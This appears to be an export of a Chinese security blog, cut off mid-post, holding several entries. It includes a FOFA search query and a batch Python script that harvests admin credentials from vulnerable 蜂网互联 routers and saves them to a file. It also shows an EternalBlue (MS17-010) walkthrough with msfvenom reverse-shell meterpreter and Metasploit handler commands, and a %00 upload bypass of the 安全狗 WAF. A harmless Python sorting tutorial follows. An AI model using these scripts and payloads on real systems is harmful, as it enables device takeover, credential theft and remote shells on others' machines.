    <content><![CDATA[<h1 id="【漏洞复现】蜂网互联-企业级路由器v4-31-密码泄露漏洞"><a href="#【漏洞复现】蜂网互联-企业级路由器v4-31-密码泄露漏洞" class="headerlink" title="【漏洞复现】蜂网互联 企业级路由器v4.31 密码泄露漏洞"></a>【漏洞复现】蜂网互联 企业级路由器v4.31 密码泄露漏洞</h1><p>蜂网互联企业级路由器v4.31存在接口未授权访问，导致攻击者可以是通过此漏洞得到路由器账号密码接管路由器</p>
<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>蜂网互联企业级路由器v4.31</p>
<h1 id="fofa语法"><a href="#fofa语法" class="headerlink" title="fofa语法"></a>fofa语法</h1><p><code>app=&quot;蜂网互联-互联企业级路由器&quot;</code></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p> <code>/action/usermanager.htm</code> 存在未授权访问，可通过直接访问获得账号密码</p>
<p><img src="/2023/03/17/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E8%9C%82%E7%BD%91%E4%BA%92%E8%81%94-%E4%BC%81%E4%B8%9A%E7%BA%A7%E8%B7%AF%E7%94%B1%E5%99%A8v4-31-%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/image-20230317174618434.png" alt="image-20230317174618434"></p>
<p>md5直接解密就可以了</p>
<h1 id="批量检测脚本"><a href="#批量检测脚本" class="headerlink" title="批量检测脚本"></a>批量检测脚本</h1><p>用原作者的脚本稍微改了一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># import time</span></span><br><span class="line"><span class="comment"># import eventlet</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  _____             _                                                     </span></span><br><span class="line"><span class="string"> |  __ \           | |                                                    </span></span><br><span class="line"><span class="string"> | |__) |___  _   _| |_ ___ _ __   ___  ___ __ _ _ __                     </span></span><br><span class="line"><span class="string"> |  _  // _ \| | | | __/ _ \ &#x27;__| / __|/ __/ _` | &#x27;_ \                    </span></span><br><span class="line"><span class="string"> | | \ \ (_) | |_| | ||  __/ |    \__ \ (_| (_| | | | |                   </span></span><br><span class="line"><span class="string"> |_|  \_\___/ \__,_|\__\___|_|   _|___/\___\__,_|_| |_|                   </span></span><br><span class="line"><span class="string">                                | |         | |                           </span></span><br><span class="line"><span class="string">                          ______| |__  _   _| |_   _ _______  _ __   __ _ </span></span><br><span class="line"><span class="string">                         |______| &#x27;_ \| | | | | | | |_  / _ \| &#x27;_ \ / _` |</span></span><br><span class="line"><span class="string">                                | |_) | |_| | | |_| |/ / (_) | | | | (_| |</span></span><br><span class="line"><span class="string">                                |_.__/ \__, |_|\__,_/___\___/|_| |_|\__, |</span></span><br><span class="line"><span class="string">                                        __/ |                        __/ |</span></span><br><span class="line"><span class="string">                                       |___/                        |___/                                                                                                      </span></span><br><span class="line"><span class="string">    	&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpass</span>(<span class="params">target</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(target + <span class="string">&#x27;/action/usermanager.htm&#x27;</span>, timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="comment"># return r.text</span></span><br><span class="line">        <span class="comment"># print(&#x27;===========&#x27;)</span></span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="comment"># print(&#x27;===========&#x27;)</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-]&#x27;</span> + target + <span class="string">&#x27;请求超时&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            s = json.loads(r.text)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;rows&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">                s = <span class="built_in">str</span>(s[<span class="string">&#x27;rows&#x27;</span>])</span><br><span class="line">                s = s.replace(<span class="string">&quot;[&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                s = s.replace(<span class="string">&quot;]&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                s = s.replace(<span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>)</span><br><span class="line">                s2 = json.loads(s)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span> + <span class="string">&quot;账号:&quot;</span> + s2[<span class="string">&#x27;user&#x27;</span>] + <span class="string">&quot;，密码:&quot;</span> + s2[<span class="string">&#x27;pwd&#x27;</span>] + <span class="string">&quot;\n登录地址为:&quot;</span> + target + <span class="string">&quot;/login.html&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[-]&#x27;</span> + target + <span class="string">&quot;不存在该漏洞&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-]&#x27;</span> + target + <span class="string">&#x27;请求被拒绝&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getpass1</span>(<span class="params">target</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(target + <span class="string">&#x27;/action/usermanager.htm&#x27;</span>, timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="comment"># return r.text</span></span><br><span class="line">            <span class="comment"># print(&#x27;===========&#x27;)</span></span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            <span class="comment"># print(&#x27;===========&#x27;)</span></span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-]&#x27;</span> + target + <span class="string">&#x27;请求超时&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">                s = json.loads(r.text)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;rows&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">                    s = <span class="built_in">str</span>(s[<span class="string">&#x27;rows&#x27;</span>])</span><br><span class="line">                    s = s.replace(<span class="string">&quot;[&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                    s = s.replace(<span class="string">&quot;]&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                    s = s.replace(<span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>)</span><br><span class="line">                    s2 = json.loads(s)</span><br><span class="line">                    sur = (<span class="string">&#x27;[+]&#x27;</span> + <span class="string">&quot;账号:&quot;</span> + s2[<span class="string">&#x27;user&#x27;</span>] + <span class="string">&quot;，密码:&quot;</span> + s2[<span class="string">&#x27;pwd&#x27;</span>] + <span class="string">&quot;\n登录地址为:&quot;</span> + target + <span class="string">&quot;/login.html&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(sur)</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;success.txt&#x27;</span>, mode=<span class="string">&quot;a&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        f.write(sur + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;[-]&#x27;</span> + target + <span class="string">&quot;不存在该漏洞&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[-]&#x27;</span> + target + <span class="string">&#x27;请求被拒绝&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未知错误&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    usage = <span class="string">&quot;example: python3 %prog -t 目标(格式：http://112.53.152.210:888)&quot;</span></span><br><span class="line">    parser = OptionParser(usage=usage)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-t&#x27;</span>, dest=<span class="string">&#x27;target&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;string&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;目标ip&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&#x27;-r&#x27;</span>, dest=<span class="string">&#x27;file1&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;string&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;目标ip合并文本文档&#x27;</span>)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    target = options.target</span><br><span class="line">    file1 = options.file1</span><br><span class="line">    <span class="keyword">if</span> target:</span><br><span class="line">        getpass(target)</span><br><span class="line">    <span class="keyword">if</span> file1:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file1, mode=<span class="string">&#x27;rt&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">                line = line.rstrip()</span><br><span class="line">                getpass1(line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    banner()</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>【漏洞复现】采用纯py3工具复现ms17010</title>
    <url>/2023/02/17/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E9%87%87%E7%94%A8%E7%BA%AFpy3%E5%B7%A5%E5%85%B7%E5%A4%8D%E7%8E%B0ms17010/</url>
    <content><![CDATA[<h1 id="【漏洞复现】采用纯py3工具复现ms17010"><a href="#【漏洞复现】采用纯py3工具复现ms17010" class="headerlink" title="【漏洞复现】采用纯py3工具复现ms17010"></a>【漏洞复现】采用纯py3工具复现ms17010</h1><p>之前在实战中碰到了ms17010但是打不回来，遂找到了一款工具，记录一下。</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>环境就要一个win7就可以，网上下。</p>
<p>攻击机用kali，内网穿透用花生壳，工具的话用这个。</p>
<p><a href="https://www.t00ls.com/thread-39817-1-1.html">MS17-010纯python3利用程序（Eternalblue、优化代码） - 安全检测工具(Security Testing T00ls) - T00ls | 低调求发展 - 潜心习安全</a></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>开启环境之后，记得把win7的防火墙关了。</p>
<p>首先用<code>use auxiliary/scanner/smb/smb_ms17_010 </code>模块扫到对面靶机存在漏洞。</p>
<p><img src="/2023/02/17/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E9%87%87%E7%94%A8%E7%BA%AFpy3%E5%B7%A5%E5%85%B7%E5%A4%8D%E7%8E%B0ms17010/image-20230217201845290.png" alt="image-20230217201845290"></p>
<p>然后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=(你自己的穿透) LPORT=35932 -f raw &gt; shellcode</span><br></pre></td></tr></table></figure>

<p>kali上进行监听，监听的时候用内网穿透内网的ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set LHOST 192.168.32.108</span><br><span class="line">set LPORT 1234</span><br><span class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>来到利用工具的目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python C:\工具\内网渗透\漏洞利用\ms17010\ms17-010.py --host 192.168.32.112 --file C:\ 工具\内网渗透\漏洞利用\ms17010\shellcode</span><br></pre></td></tr></table></figure>

<p>可以看到，自己的msf上已经有会话了。</p>
<p>乱码问题用<code>chcp 65001</code>解决</p>
<p><img src="/2023/02/17/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E9%87%87%E7%94%A8%E7%BA%AFpy3%E5%B7%A5%E5%85%B7%E5%A4%8D%E7%8E%B0ms17010/image-20230217202416003.png" alt="image-20230217202416003"></p>
<p><img src="/2023/02/17/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E9%87%87%E7%94%A8%E7%BA%AFpy3%E5%B7%A5%E5%85%B7%E5%A4%8D%E7%8E%B0ms17010/image-20230217202425119.png" alt="image-20230217202425119"></p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>【绕过】安全狗4.0文件上传绕过</title>
    <url>/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="【绕过】安全狗4-0文件上传绕过"><a href="#【绕过】安全狗4-0文件上传绕过" class="headerlink" title="【绕过】安全狗4.0文件上传绕过"></a>【绕过】安全狗4.0文件上传绕过</h1><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这个是演示代码，直接放在phpstudy上面就可以了</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>upload_file.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="comment">//开源软件:phpfensi.com</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Size: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>下载安全狗4.0</p>
<p><a href="http://down.safedog.cn/download/software/safedogwzApache.exe">http://down.safedog.cn/download/software/safedogwzApache.exe</a></p>
<p><img src="/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/image-20230713200343946.png" alt="image-20230713200343946"></p>
<p>apache需要注册为服务可执行命令完成此操作。</p>
<p><img src="/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/image-20230713200810998.png" alt="image-20230713200810998"></p>
<p>之后安装相应插件，并且开启服务。</p>
<h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><p>正常上传，被拦截</p>
<p><img src="/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/image-20230713201821622.png" alt="image-20230713201821622"></p>
<p>后缀使用%00拦截并url编码绕过</p>
<p><img src="/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/image-20230713201906829.png" alt="image-20230713201906829"></p>
<p><img src="/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/image-20230713201914581.png" alt="image-20230713201914581"></p>
<p><img src="/2023/07/13/%E3%80%90%E7%BB%95%E8%BF%87%E3%80%91%E5%AE%89%E5%85%A8%E7%8B%974-0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/image-20230713201946519.png" alt="image-20230713201946519"></p>
<p>成功绕过（这个东西是网站的白名单，但是安全狗确实是被绕过了的）</p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>一、拓展py：方法和函数拓展 sort sorted</title>
    <url>/2022/01/05/%E4%B8%80%E3%80%81%E6%8B%93%E5%B1%95py%EF%BC%9A%E6%96%B9%E6%B3%95%E5%92%8C%E5%87%BD%E6%95%B0%E6%8B%93%E5%B1%95-sort-sorted/</url>
    <content><![CDATA[<h1 id="python方法和函数拓展-sort-sorted"><a href="#python方法和函数拓展-sort-sorted" class="headerlink" title="python方法和函数拓展 sort sorted"></a>python方法和函数拓展 sort sorted</h1><h2 id="1-sort-与-sorted的区别"><a href="#1-sort-与-sorted的区别" class="headerlink" title="1.sort 与 sorted的区别"></a>1.sort 与 sorted的区别</h2><p>sort是对列表本身进行永久性的排序。</p>
<p>sorted则会返回一个排序之后的列表，不会对列表本身进行修改。</p>
<p>sort 是应用在 list 上的方法，sorted 可以对所有可迭代的对象进行排序操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="built_in">list</span>.sort()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[1, 2, 3]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line">new_list = <span class="built_in">sorted</span>(<span class="built_in">list</span>)</span><br><span class="line"><span class="built_in">print</span>(new_list)<span class="comment">#[1, 2, 3]</span></span><br></pre></td></tr></table></figure>

<h2 id="2-sort"><a href="#2-sort" class="headerlink" title="2.sort"></a>2.sort</h2><h3 id="2-1参数"><a href="#2-1参数" class="headerlink" title="2.1参数"></a>2.1参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>.sort(cmp=<span class="literal">None</span>, key=<span class="literal">None</span>, reverse=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>cmp – 可选参数, 如果指定了该参数会使用该参数的方法进行排序。</li>
<li>key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li>
<li>reverse – 排序规则，<strong>reverse = True</strong> 降序， <strong>reverse = False</strong> 升序（默认）。</li>
</ul>
<h3 id="2-2key参数的应用"><a href="#2-2key参数的应用" class="headerlink" title="2.2key参数的应用"></a>2.2key参数的应用</h3><p>根据列表中指定的元素进行排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#定义一个取第二个元素的函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">takesecond</span>(<span class="params">item</span>):</span></span><br><span class="line">    <span class="keyword">return</span> item[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#循环列表中的每一个元素，并且根据元素中的第二个元素进行排序。</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=takesecond)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[12, 1], [32, 2], [1, 3]]</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#定义了一个匿名函数，参数x，返回x中的第二个元素</span></span><br><span class="line"><span class="comment">#key 指定了根据x的第二个元素进行排序</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[12, 1], [32, 2], [1, 3]]</span></span><br></pre></td></tr></table></figure>

<p>key会把列表的元素作为参数传入后面的函数，然后把函数的返回值作为排序的依据。</p>
<h4 id="2-2-1扩展"><a href="#2-2-1扩展" class="headerlink" title="2.2.1扩展"></a>2.2.1扩展</h4><p>如果key接受了两个返回值，那么第一个返回值就会是首要排序依据，如果第一个返回值相等，那么会根据第二个返回值进行排序。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>],[<span class="number">31</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#定义了一个匿名函数，返回第一个元素和第二个元素</span></span><br><span class="line"><span class="comment">#key就会让x[1]成为首要排序依据，另一个成为次要依据</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=<span class="keyword">lambda</span> x:(x[<span class="number">1</span>],x[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[12, 1], [31, 2], [32, 2], [1, 3]]</span></span><br></pre></td></tr></table></figure>



<h3 id="2-3reverse参数的应用"><a href="#2-3reverse参数的应用" class="headerlink" title="2.3reverse参数的应用"></a>2.3reverse参数的应用</h3><p><strong>reverse = True</strong> 降序， <strong>reverse = False</strong> 升序（默认）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span> = [[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">12</span>,<span class="number">1</span>],[<span class="number">32</span>,<span class="number">2</span>],[<span class="number">31</span>,<span class="number">2</span>]]</span><br><span class="line"><span class="comment">#设置为降序，从大到小。</span></span><br><span class="line"><span class="built_in">list</span>.sort(key=<span class="keyword">lambda</span> x:(x[<span class="number">1</span>],x[<span class="number">0</span>]),reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>)<span class="comment">#[[1, 3], [32, 2], [31, 2], [12, 1]]</span></span><br></pre></td></tr></table></figure>

<h2 id="3-sorted"><a href="#3-sorted" class="headerlink" title="3.sorted"></a>3.sorted</h2><h3 id="3-1参数"><a href="#3-1参数" class="headerlink" title="3.1参数"></a>3.1参数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sorted</span>(iterable, cmp=<span class="literal">None</span>, key=<span class="literal">None</span>, reverse=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>iterable – 可迭代对象。</li>
<li>cmp – 比较的函数，这个具有两个参数，参数的值都是从可迭代对象中取出，此函数必须遵守的规则为，大于则返回1，小于则返回-1，等于则返回0。</li>
<li>key – 主要是用来进行比较的元素，只有一个参数，具体的函数的参数就是取自于可迭代对象中，指定可迭代对象中的一个元素来进行排序。</li>
<li>reverse – 排序规则，reverse = True 降序 ， reverse = False 升序（默认）。</li>
</ul>
<h3 id="3-2对key参数的应用"><a href="#3-2对key参数的应用" class="headerlink" title="3.2对key参数的应用"></a>3.2对key参数的应用</h3><p>按value值对字典排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = &#123;<span class="string">&quot;a&quot;</span>:<span class="number">3</span>,<span class="string">&quot;b&quot;</span>:<span class="number">1</span>,<span class="string">&quot;c&quot;</span>:<span class="number">2</span>&#125;</span><br><span class="line"><span class="comment">#指定迭代对象是字典中的每一个键值对</span></span><br><span class="line"><span class="comment">#将键值对作为参数传入匿名函数，返回值，将value作为排序的标准</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(d.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>]))</span><br><span class="line"><span class="comment">#[(&#x27;b&#x27;, 1), (&#x27;c&#x27;, 2), (&#x27;a&#x27;, 3)]</span></span><br></pre></td></tr></table></figure>

<h3 id="3-3对cmp参数的使用（效率key-gt-cmp）"><a href="#3-3对cmp参数的使用（效率key-gt-cmp）" class="headerlink" title="3.3对cmp参数的使用（效率key&gt;cmp）"></a>3.3对cmp参数的使用（效率key&gt;cmp）</h3><p>发现在py3中取消了cmp参数，那就不写啦！</p>
<h3 id="3-4reverse"><a href="#3-4reverse" class="headerlink" title="3.4reverse"></a>3.4reverse</h3><p>和上面的一样的</p>
<h2 id="4-应用扩展"><a href="#4-应用扩展" class="headerlink" title="4.应用扩展"></a>4.应用扩展</h2><p>输入名字（英文），名字在前面形式在后面中间用空格分离，要求根据姓氏排序，姓氏首字母一样就用名字排序，然后输出一个列表，每一个元素装一个名字。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sName=<span class="built_in">input</span>(<span class="string">&quot;输入名字，名前后姓，quit退出&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;quit&quot;</span></span><br><span class="line">a=[]</span><br><span class="line"><span class="keyword">while</span> sName!=<span class="string">&quot;quit&quot;</span>:</span><br><span class="line">    a.append(sName)</span><br><span class="line">    sName=<span class="built_in">input</span>() <span class="keyword">or</span> <span class="string">&quot;quit&quot;</span></span><br><span class="line"><span class="comment"># 把名字和姓氏组成一个列表嵌套进一个列表中</span></span><br><span class="line">Allname=[x.split() <span class="keyword">for</span> x <span class="keyword">in</span> a]</span><br><span class="line"><span class="comment">#排序</span></span><br><span class="line">Allname.sort(key=<span class="keyword">lambda</span> x:(x[<span class="number">1</span>],x[<span class="number">0</span>]))</span><br><span class="line">final=[]</span><br><span class="line"><span class="comment">#把嵌套的列表转换回来</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Allname)):</span><br><span class="line">    final.append(<span 